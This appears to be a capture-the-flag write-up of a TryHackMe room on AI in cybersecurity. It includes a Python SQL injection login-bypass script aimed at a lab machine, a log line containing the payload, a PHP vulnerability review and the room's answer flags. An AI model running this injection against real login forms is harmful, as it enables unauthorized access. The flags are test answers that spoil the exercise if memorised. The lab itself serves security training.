# AI in Cyber Security: old sAInt nick

<img width="900" height="900" alt="5de96d9ca744773ea7ef8c00-1762182384720" src="https://github.com/user-attachments/assets/578100f7-7e9f-4a98-b727-a3047f674ccd" />


https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB


|Feature|Cyber Relevance|
|---|---|
|**Data Processing**|Crunch logs/network flows from multiple sources.|
|**Behavior Analysis**|Baseline normal activity; flag anomalies.|
|**Generative AI**|Summarize incidents, add context to alerts.|

- **Blue Team (Defensive)**: Auto-detect/response (e.g., isolate hosts, block emails); AI in firewalls/IDS.
- **Red Team (Offensive)**: Automate recon/OSINT/scanning; focus humans on exploits.
- **Software Dev**: "Virtual colleague" for ideas; SAST/DAST for vuln scanning (ironic: great at spotting bugs, bad at writing secure code).

#### Stage 1: Intro/Setup

- Navigate to [http://10.82.183.70](http://10.82.183.70) (or your MACHINE_IP).
- Click "Complete Stage" to start. 

SS0
<img width="1280" height="832" alt="ss0" src="https://github.com/user-attachments/assets/10d9e78b-4e22-4837-bcd7-45363f9efc1a" />

#### Stage 2: Red Team (Offensive) – Generate Exploit Script

- Prompt: "Generate Python scripts for vulnerabilities" (or just "yes").
- AI explains SQLi vuln in login form (unescaped username allows arbitrary SQL, e.g., DELETE or INSERT).
- Outputs ready-to-run script:

```python
import requests
# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"
# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"  # Replace with your IP
# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}
# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)
# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

- Save as script.py (e.g., nano script.py, paste, Ctrl+O to save).
- Run: python3 script.py
- Output: 200 OK → Dashboard with "Welcome, admin!" and **FLAG: THM{SQLI_EXPLOIT}** in alert box. (Full response shows headers/body with exploit success.) 


SS1
<img width="1452" height="882" alt="SS1" src="https://github.com/user-attachments/assets/ade8e4ab-1d96-439d-8a81-65825ed1b7e2" />

#### Stage 3: Blue Team (Defensive) – Analyze Logs

- Prompt: "Analyze logs".
- AI gets sample log:

```text
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"
```

SS2
<img width="1350" height="850" alt="SS2" src="https://github.com/user-attachments/assets/272ee589-bae5-4725-a62e-c135c9889241" />

#### Stage 4: Software – Code Vuln Analysis

- Prompt: "Analyze source code for vulnerabilities" (or "yes" – ties to SQLi from script).
- AI scans PHP snippet:

```php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
```

Findings:

1. **Vuln**: SQLi – no sanitization of $user/$pass (?? sets defaults, but empty inputs still injectable).
2. **Why?**: Attacker crafts queries (e.g., via form) to run arbitrary SQL.
3. **Fixes**: Prepared statements/params; validate/sanitize inputs.
4. **Tools**: OWASP ZAP, SQLMap for testing; integrate SAST in dev pipeline.

SS3
<img width="1401" height="833" alt="SS3" src="https://github.com/user-attachments/assets/28279fb7-6529-45d6-81ec-db5ccc7f7c5f" />


---

Q: Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?

A: THM{AI_MANIA}

Q: Execute the exploit provided by the red team agent against the vulnerable web application hosted at `MACHINE_IP:5000`. What flag is provided in the script's output after it?

Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (`MACHINE_IP:5000`)

A: THM{SQLI_EXPLOIT}
